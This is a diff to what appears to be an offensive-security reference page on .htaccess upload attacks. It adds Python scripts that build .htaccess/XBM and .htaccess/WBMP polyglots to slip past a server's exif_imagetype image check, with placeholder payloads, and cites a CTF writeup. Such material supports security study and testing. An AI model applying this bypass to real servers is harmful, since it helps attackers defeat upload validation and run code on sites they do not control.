@@ -27,16 +27,40 @@ AddType application/x-httpd-php .htaccess
 
 # .htaccess upload as image
 
-If on server side for determine the type of an image used exif_imagetype function, try upload .htaccess file like [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) image.
+If the exif_imagetype function is used on the server side to determine the image type, create a .htaccess/image polyglot. 
+
+[Supported image types](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap) and [WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format). In .htacces ignoring lines starting with `\x00` and `#`, you can use these scripts for generate a valid .htaccess/image polyglot.
 
 ```python
-#define test_width 100
-#define test_height 100
+# create valid .htaccess/xbm image
 
-# .htaccess file
+width = 50
+height = 50
+payload = '# .htaccess file'
+
+with open('.htaccess', 'w') as htaccess:
+    htaccess.write('#define test_width %d\n' % (width, ))
+    htaccess.write('#define test_height %d\n' % (height, ))
+    htaccess.write(payload)
+```
+or
+```python
+# create valid .htaccess/wbmp image
+
+type_header = b'\x00'
+fixed_header = b'\x00'
+width = b'50'
+height = b'50'
+payload = b'# .htaccess file'
+
+with open('.htaccess', 'wb') as htaccess:
+    htaccess.write(type_header + fixed_header + width + height)
+    htaccess.write(b'\n')
+    htaccess.write(payload)
 ```
 
 ## Thanks to
 
 * [ATTACKING WEBSERVERS VIA .HTACCESS - By Eldar Marcussen](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
 * [Protection from Unrestricted File Upload Vulnerability](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
+* [Writeup to l33t-hoster task, Insomnihack Teaser 2019/](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
